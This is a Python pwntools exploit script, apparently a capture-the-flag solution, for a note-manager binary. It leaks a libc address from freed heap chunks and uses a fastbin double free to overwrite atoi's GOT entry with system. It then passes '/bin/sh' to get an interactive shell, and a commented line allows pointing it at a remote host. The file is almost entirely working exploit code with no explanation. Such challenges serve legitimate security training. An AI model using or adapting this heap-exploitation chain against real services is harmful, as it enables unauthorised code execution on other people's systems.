#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./test"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Length of new note: ",str(length))
    p.sendlineafter("Enter your note: ",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Note number: ",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Note number: ",str(idx))
    p.sendlineafter("Length of note: ",str(length))
    p.sendlineafter("Enter your note: ",str(content))

def show():
    opt(1)


# leak
add(0x80,"a"*0x80)
add(0x80,"b"*0x80)
add(0x80,"c"*0x80)
add(0x80,"d"*0x80)

free(2) # 2
free(0) # 0
add(0x80,"A"*0x8) # idx = 0, chunk idx = 2
free(2) # 2
add(0x80,"A"*0x80) # 0
show()

p.recvuntil("0. ")
libc_base = u64(p.recv(6).ljust(8,"\0")) - 0x3c4b78
system_addr = libc_base + libc.sym["system"]
one_addr = libc_base + 0x4527a
log.success("system_addr is -> "+ hex( system_addr ))

add(0x30,"a")
add(0x30,"a")
add(0x30,"a")
free(4)
free(6)
free(4)
target = elf.got["atoi"] - 0x16
add(0x30,p64(target))
add(0x30,"a")
add(0x30,"a")
add(0x30,"\xa7\xf7\xff\x7f\x00\x00"+p64(system_addr))

p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $g=0x603010,$h=0x604820\nb *0x7ffff7dd1b08")

p.interactive()
